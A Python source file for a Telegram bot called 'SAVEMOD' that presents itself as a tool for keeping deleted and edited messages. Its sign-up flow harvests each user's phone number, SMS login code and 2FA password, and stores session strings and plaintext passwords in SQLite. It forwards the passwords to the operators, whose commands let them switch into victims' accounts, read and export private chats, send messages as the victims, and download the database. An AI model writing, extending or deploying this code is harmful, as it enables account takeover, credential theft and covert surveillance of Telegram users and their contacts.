import asyncio
import sqlite3
import os
import sys
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread
from typing import Optional, Dict, List, Any, Tuple

from flask import Flask, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline
from telethon.tl.functions.account import UpdateStatusRequest
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import nest_asyncio
import pytz

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("Ошибка: Не заданы переменные окружения")
    sys.exit(1)

logger.info(f"Администраторы: {ADMIN_IDS}")

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')
logger.info(f"📁 База данных: {DB_PATH}")

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string TEXT,
        phone TEXT,
        two_fa TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT
    )
''')
try:
    cursor.execute('ALTER TABLE user_sessions ADD COLUMN registered_at TEXT')
except:
    pass

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')
try:
    cursor.execute('ALTER TABLE muted_users ADD COLUMN muted_at TEXT')
except:
    pass

cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS spy_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        sender_id INTEGER,
        sender_name TEXT,
        message TEXT,
        chat_id INTEGER,
        chat_name TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_status_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        user_id INTEGER,
        user_name TEXT,
        status TEXT
    )
''')

conn.commit()

active_clients = {}
saved_messages = {}
temp_auth = {}
active_chats = {}
user_status_tracker = {}
current_active_user = None
pending_2fa = {}

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)

tz = pytz.timezone('Europe/Saratov')

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_target_admin(target_id):
    return target_id in ADMIN_IDS

def escape_html(text):
    return html.escape(str(text))

def get_active_client():
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client, target):
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        return await client.get_entity(target)
    except:
        return None

async def send_to_admin(text):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode='HTML')
        except:
            pass

def get_code_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_digit_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_digit_0"),
        InlineKeyboardButton("⌫", callback_data="code_backspace"),
        InlineKeyboardButton("✅", callback_data="code_submit")
    )
    return kb

async def export_chat_to_html(client, chat_id, chat_name, me):
    messages = []
    async for msg in client.iter_messages(chat_id, limit=1000):
        if msg.text:
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Вы)"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                
                dt = msg.date.astimezone(tz)
                time_str = dt.strftime('%H:%M')
                date_str = dt.strftime('%d.%m.%Y')
                text = escape_html(msg.text).replace('\n', '<br>')
                
                messages.append(f'''
                <div class="msg">
                    <div class="sender">{escape_html(sender_name)}</div>
                    <div class="time">{time_str} {date_str}</div>
                    <div class="text">{text}</div>
                </div>
                ''')
            except:
                continue
    
    if not messages:
        return None
    
    messages.reverse()
    
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Чат с {escape_html(chat_name)}</title>
<style>
body{{font-family:Arial;background:#0e1621;color:#e1e8f0;padding:20px}}
.container{{max-width:800px;margin:0 auto;background:#17212b;border-radius:10px;padding:20px}}
.msg{{margin-bottom:15px;padding:10px;background:#2b3945;border-radius:10px}}
.sender{{font-weight:bold;color:#e1e8f0}}
.time{{font-size:10px;color:#6c7883}}
.text{{font-size:14px;margin-top:5px}}
</style>
</head>
<body>
<div class="container">
<h2>Чат с {escape_html(chat_name)}</h2>
<p>Всего сообщений: {len(messages)}</p>
{''.join(messages)}
<p>📅 {datetime.now(tz).strftime('%d.%m.%Y %H:%M:%S')}</p>
</div>
</body>
</html>'''

# ========== АДМИН КОМАНДЫ ==========

@dp.message_handler(commands=['spyhelp'])
async def cmd_spyhelp(message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("""
🔰 <b>SAVEMOD - КОМАНДЫ</b>

<b>АККАУНТЫ</b>
/users - список аккаунтов
/swap НОМЕР - переключиться
/active - активный
/del_session НОМЕР - удалить сессию
/sessions - список сессий
/reset_me - сбросить сессию

<b>ДЕЙСТВИЯ</b>
/send ID/@username текст
/chats - список диалогов
/chat ID или @username - просмотр чата
/status @username - статус
/online - кто в сети

<b>ДРУГОЕ</b>
/logs N - логи
/stats - статистика
/backup - бэкап
/ghost on/off - режим призрака

<b>ЮЗЕРБОТ (через точку в ЛС)</b>
.help .mute .unmute .list .spam .type .info
""", parse_mode='HTML')

@dp.message_handler(commands=['ghost'])
async def cmd_ghost(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    if args and args.lower() == 'on':
        await cl(UpdateStatusRequest(offline=True))
        await message.answer("👻 Режим призрака ВКЛЮЧЕН")
    elif args and args.lower() == 'off':
        await cl(UpdateStatusRequest(offline=False))
        await message.answer("👻 Режим призрака ВЫКЛЮЧЕН")
    else:
        await message.answer("/ghost on - включить\n/ghost off - выключить")

@dp.message_handler(commands=['users'])
async def cmd_users(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username, phone, two_fa, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет аккаунтов")
        return
    out = "👥 <b>АККАУНТЫ</b>\n\n"
    i = 0
    for uid, fn, un, ph, tf, act in rows:
        if is_target_admin(uid):
            continue
        i += 1
        name = fn or un or str(uid)
        actm = " ✅" if (act == 1 or uid == current_active_user) else ""
        out += f"<b>{i}. {name}</b>{actm}\n   🆔 <code>{uid}</code>\n   📱 {ph or '-'}\n   🔐 {'✅' if tf else '❌'}\n\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')

@dp.message_handler(commands=['sessions'])
async def cmd_sessions(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет сессий")
        return
    lst = []
    for uid, fn, un in rows:
        if is_target_admin(uid):
            continue
        name = fn or un or str(uid)
        st = "✅" if uid in active_clients else "❌"
        lst.append(f"{st} <code>{uid}</code> - {name}")
    await message.answer("📋 <b>СЕССИИ</b>\n\n" + "\n".join(lst), parse_mode='HTML')

@dp.message_handler(commands=['del_session'])
async def cmd_del_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        tid, fn, un = na[num]
        name = fn or un or str(tid)
        if tid in active_clients:
            try:
                await active_clients[tid].disconnect()
            except:
                pass
            del active_clients[tid]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (tid,))
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (tid,))
        conn.commit()
        await message.answer(f"✅ Сессия {name} удалена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message):
    uid = message.from_user.id
    if uid in active_clients:
        try:
            await active_clients[uid].disconnect()
        except:
            pass
        del active_clients[uid]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
    conn.commit()
    await message.answer("✅ Сессия удалена. Отправь /start")

@dp.message_handler(commands=['active'])
async def cmd_active(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        me = await cl.get_me()
        await message.answer(f"✅ Активный: {me.first_name}")
    except:
        await message.answer(f"✅ Активный ID: {uid}")

# ===== ИСПРАВЛЕННЫЙ /swap =====
@dp.message_handler(commands=['swap'])
async def cmd_swap(message):
    global current_active_user
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /swap НОМЕР (номер из /users)")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        # Исключаем админов
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер. Используй /users для просмотра")
            return
        user_id = na[num][0]
        name = na[num][1] or na[num][2] or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт {name} не запущен")
            return
        current_active_user = user_id
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
        conn.commit()
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на {me.first_name}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['send'])
async def cmd_send(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /send @username текст")
        return
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ /send @username текст")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, parts[0])
    if not ent:
        await message.answer("❌ Не найден")
        return
    try:
        await cl.send_message(ent.id, parts[1])
        await message.answer(f"✅ Отправлено")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['chats'])
async def cmd_chats(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    await message.answer("🔄 Собираю список диалогов...")
    chats = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                    continue
                name = ent.first_name or ent.username or str(ent.id)
                chats.append({'id': ent.id, 'name': name})
            except:
                chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id)})
    active_chats[uid] = chats
    if not chats:
        await message.answer("📭 Нет диалогов")
        return
    out = "📋 <b>ДИАЛОГИ</b>\n\n"
    for i, ch in enumerate(chats):
        out += f"{i+1}. {ch['name']}\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')
    await message.answer("💡 /chat ID или @username - посмотреть чат")

# ===== ИСПРАВЛЕННЫЙ /chat - РАБОТАЕТ ПО ID И @username =====
@dp.message_handler(commands=['chat'])
async def cmd_chat(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /chat ID или @username")
        return
    
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    
    # Пробуем найти пользователя по ID или @username
    try:
        if args.isdigit():
            ent = await cl.get_entity(int(args))
        else:
            ent = await resolve_entity(cl, args)
        if not ent or ent.id == uid or is_target_admin(ent.id):
            await message.answer("❌ Пользователь не найден")
            return
        target_id = ent.id
        target_name = ent.first_name or ent.username or args
    except Exception as e:
        await message.answer(f"❌ Пользователь не найден: {e}")
        return
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📝 Последние 30", callback_data=f"last_{target_id}_{target_name}"),
        InlineKeyboardButton("📄 Экспорт HTML", callback_data=f"html_{target_id}_{target_name}")
    )
    
    await message.answer(f"📱 <b>Чат с {target_name}</b>\n\nВыбери действие:", parse_mode='HTML', reply_markup=kb)

# ===== ИСПРАВЛЕННЫЙ ПОКАЗ ПОСЛЕДНИХ 30 =====
@dp.callback_query_handler(lambda c: c.data.startswith('last_'))
async def show_last(cb):
    if not is_admin(cb.from_user.id):
        await cb.answer("❌ Нет прав")
        return
    
    data = cb.data.replace('last_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("❌ Нет активного аккаунта")
        return
    
    await cb.answer("Загружаю последние 30 сообщений...")
    
    msgs = []
    async for msg in cl.iter_messages(target_id, limit=30):
        if msg.text:
            try:
                if msg.out:
                    sn = "👉 Я"
                else:
                    s = await cl.get_entity(msg.sender_id)
                    if is_target_admin(s.id):
                        continue
                    sn = s.first_name or s.username or str(s.id)
                dt = msg.date.strftime('%d.%m %H:%M')
                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
    
    if msgs:
        response = f"💬 <b>ЧАТ С {target_name}</b>\n\n" + "\n".join(reversed(msgs))
        if len(response) > 4000:
            for i in range(0, len(msgs), 15):
                part = "\n".join(reversed(msgs[i:i+15]))
                await cb.message.answer(f"💬 <b>ЧАТ С {target_name}</b>\n\n{part}", parse_mode='HTML')
        else:
            await cb.message.answer(response, parse_mode='HTML')
    else:
        await cb.message.answer("📭 Нет сообщений или только медиа")

# ===== ИСПРАВЛЕННЫЙ ЭКСПОРТ HTML =====
@dp.callback_query_handler(lambda c: c.data.startswith('html_'))
async def export_html(cb):
    if not is_admin(cb.from_user.id):
        await cb.answer("❌ Нет прав")
        return
    
    data = cb.data.replace('html_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("❌ Нет активного аккаунта")
        return
    
    await cb.answer("Экспортирую чат в HTML...")
    
    try:
        me = await cl.get_me()
        html_content = await export_chat_to_html(cl, target_id, target_name, me)
        
        if not html_content:
            await cb.message.answer("❌ Нет текстовых сообщений для экспорта")
            return
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            path = f.name
        
        if os.path.getsize(path) == 0:
            await cb.message.answer("❌ Ошибка: файл пустой")
            os.unlink(path)
            return
        
        with open(path, 'rb') as f:
            await bot.send_document(cb.from_user.id, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
        
        os.unlink(path)
        await cb.message.answer("✅ HTML файл отправлен")
    except Exception as e:
        await cb.message.answer(f"❌ Ошибка экспорта: {e}")

@dp.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /status @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, args)
    if not ent:
        await message.answer("❌ Не найден")
        return
    st = "🟢 В сети" if isinstance(ent.status, UserStatusOnline) else "⚫ Не в сети" if isinstance(ent.status, UserStatusOffline) else "⚪ Статус скрыт"
    await message.answer(f"👤 {ent.first_name}\n🆔 {ent.id}\n📊 {st}")

@dp.message_handler(commands=['online'])
async def cmd_online(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        return
    online = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if not getattr(ent, 'bot', False) and not is_target_admin(ent.id) and isinstance(ent.status, UserStatusOnline):
                    online.append(dlg.name)
            except:
                pass
    if online:
        await message.answer(f"🟢 <b>В СЕТИ ({len(online)})</b>:\n" + "\n".join(online[:20]), parse_mode='HTML')
    else:
        await message.answer("🟢 Никого")

@dp.message_handler(commands=['logs'])
async def cmd_logs(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    lim = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (lim,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов")
        return
    out = "📜 <b>ЛОГИ</b>\n\n"
    for ts, nm, msg in reversed(rows):
        out += f"[{ts[11:16]}] {nm}: {msg[:80]}\n"
    await message.answer(out[:4000], parse_mode='HTML')

@dp.message_handler(commands=['stats'])
async def cmd_stats(message):
    if not is_admin(message.from_user.id):
        return
    logs = cursor.execute('SELECT COUNT(*) FROM spy_logs').fetchone()[0]
    acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {acc}\n💬 Сообщений: {logs}\n🟢 Активных: {len(active_clients)}", parse_mode='HTML')

@dp.message_handler(commands=['backup'])
async def cmd_backup(message):
    if not is_admin(message.from_user.id):
        return
    st = await message.answer("💾 Создаю бэкап...")
    bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, bp)
    with open(bp, 'rb') as f:
        for aid in ADMIN_IDS:
            try:
                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
                await f.seek(0)
            except:
                pass
    os.remove(bp)
    await st.edit_text("✅ Бэкап отправлен")

# ========== РЕГИСТРАЦИЯ ==========

@dp.message_handler(commands=['start'])
async def cmd_start(message):
    uid = message.from_user.id
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ <b>SAVEMOD</b> активен!\n/spyhelp - команды", parse_mode='HTML')
        if uid not in active_clients:
            asyncio.create_task(run_userbot(uid, row[0]))
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 <b>SAVEMOD</b>\nОтправь номер телефона", parse_mode='HTML', reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message):
    uid = message.from_user.id
    phone = message.contact.phone_number
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        res = await client.send_code_request(phone)
        temp_auth[uid] = {'client': client, 'phone': phone, 'hash': res.phone_code_hash, 'code': ''}
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code(cb):
    uid = cb.from_user.id
    if uid not in temp_auth:
        await cb.answer("Сессия истекла, /start")
        return
    act = cb.data.replace('code_', '')
    cur = temp_auth[uid].get('code', '')
    if act.startswith('digit_'):
        d = act.split('_')[1]
        if len(cur) < 5:
            temp_auth[uid]['code'] = cur + d
    elif act == 'backspace':
        temp_auth[uid]['code'] = cur[:-1]
    elif act == 'submit':
        if len(cur) == 5:
            await cb.answer("Авторизация...")
            await complete_auth(cb, uid)
            return
        else:
            await cb.answer("Нужно 5 цифр", show_alert=True)
            return
    code = temp_auth[uid]['code']
    disp = code if code else "_____"
    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
    await cb.answer()

async def complete_auth(cb, uid):
    data = temp_auth[uid]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await cb.message.answer(f"✅ <b>SAVEMOD</b> активирован!\n👤 {me.first_name}\n\nТеперь напиши <b>.help</b> в ЛС с собой.", parse_mode='HTML')
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del temp_auth[uid]
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, f"🎉 Новый пользователь: {me.first_name}")
            except:
                pass
    except Exception as e:
        if '2fa' in str(e).lower() or 'password' in str(e).lower():
            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
            pending_2fa[uid] = data
            del temp_auth[uid]
        else:
            await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message):
    uid = message.from_user.id
    data = pending_2fa[uid]
    try:
        await data['client'].sign_in(password=message.text.strip())
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer(f"✅ <b>SAVEMOD</b> активирован с 2FA!\n👤 {me.first_name}", parse_mode='HTML')
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del pending_2fa[uid]
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, f"🎉 Новый пользователь (2FA): {me.first_name}\n🔐 Пароль: {message.text.strip()}")
            except:
                pass
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id, session_string):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    @client.on(events.NewMessage)
    async def save_incoming(event):
        if not event.is_private or event.out:
            return
        sid = event.sender_id
        if sid in muted_users:
            await event.delete()
            return
        if event.text:
            saved_messages[owner_id][event.id] = {'sender_id': sid, 'text': event.text}
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, event.id, sid, event.text, datetime.now().isoformat()))
            conn.commit()
    
    @client.on(events.MessageDeleted)
    async def notify_delete(event):
        if not event.is_private:
            return
        for mid in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(mid)
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                row = cursor.fetchone()
                if row:
                    msg = {'sender_id': row[0], 'text': row[1]}
            if msg and msg['sender_id'] != owner_id:
                try:
                    u = await client.get_entity(msg['sender_id'])
                    name = u.first_name or 'Пользователь'
                    await send_to_admin(f"🗑 {name} удалил сообщение:\n\n{msg['text'][:500]}")
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                    conn.commit()
                except:
                    pass
    
    @client.on(events.MessageEdited)
    async def notify_edit(event):
        if not event.is_private or event.out:
            return
        mid = event.id
        ntxt = event.text or ''
        msg = saved_messages.get(owner_id, {}).get(mid)
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
            row = cursor.fetchone()
            if row:
                msg = {'sender_id': row[0], 'text': row[1]}
        if msg and msg['sender_id'] != owner_id and msg['text'] != ntxt:
            try:
                u = await client.get_entity(msg['sender_id'])
                name = u.first_name or 'Пользователь'
                await send_to_admin(f"✏️ {name} изменил сообщение:\n\nБыло: {msg['text'][:200]}\nСтало: {ntxt[:200]}")
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (ntxt, owner_id, mid))
                conn.commit()
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.is_private or not event.out:
            return
        txt = event.text or ''
        if not txt.startswith('.'):
            return
        
        if txt == '.help':
            await event.edit("""
<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>

.help - справка
.mute (ответ) - заглушить
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам
.type текст - печать
.info (ответ) - инфо
""", parse_mode='HTML')
            return
        
        if txt == '.mute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение')
                return
            tid = reply.sender_id
            if tid == owner_id or is_target_admin(tid):
                await event.edit('❌ Нельзя')
                return
            cursor.execute('INSERT INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)', (tid, owner_id, datetime.now().isoformat()))
            conn.commit()
            muted_users.add(tid)
            await event.edit(f'🔇 Заглушен')
            return
        
        if txt == '.unmute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение')
                return
            tid = reply.sender_id
            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
            conn.commit()
            muted_users.discard(tid)
            await event.edit(f'🔊 Разглушен')
            return
        
        if txt == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔇 <b>Заглушенные:</b>\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔇 Нет")
            return
        
        if txt.startswith('.spam '):
            parts = txt.split(' ', 2)
            if len(parts) >= 2:
                try:
                    cnt = min(int(parts[1]), 50)
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg:
                        await event.delete()
                        for i in range(cnt):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.05)
                except:
                    pass
            return
        
        if txt.startswith('.type '):
            t = txt[6:]
            if t:
                await event.delete()
                m = await client.send_message(event.chat_id, t[0])
                typed = t[0]
                for ch in t[1:]:
                    typed += ch
                    try:
                        await m.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.15)
            return
        
        if txt == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь на сообщение')
            return
    
    await client.run_until_disconnected()

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({'status': 'ok'})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for uid, ss in cursor.fetchall():
        if not is_target_admin(uid):
            asyncio.create_task(run_userbot(uid, ss))

async def main():
    logger.info(f"🚀 SAVEMOD запущен. Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "event loop is already running" in str(e):
            loop = asyncio.get_event_loop()
            loop.create_task(main())
        else:
            raise
